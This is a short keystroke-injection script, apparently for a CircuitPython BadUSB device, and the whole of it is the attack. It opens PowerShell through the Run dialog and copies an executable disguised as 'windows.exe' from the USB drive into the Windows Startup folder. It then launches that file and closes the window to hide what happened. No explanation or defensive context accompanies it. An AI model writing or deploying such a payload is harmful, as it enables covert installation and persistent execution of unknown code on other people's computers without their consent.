DELAY 1000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 500
STRING $drive = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'CIRCUITPY' }).DriveLetter
ENTER
DELAY 200
STRING $source = "$drive`:\windows.exe"
ENTER
DELAY 200
STRING $dest = Join-Path ([Environment]::GetFolderPath("Startup")) "windows.exe"
ENTER
DELAY 200
STRING Copy-Item -Path $source -Destination $dest -Force -Verbose
ENTER
DELAY 200
STRING Start-Process $dest
ENTER
ALT F4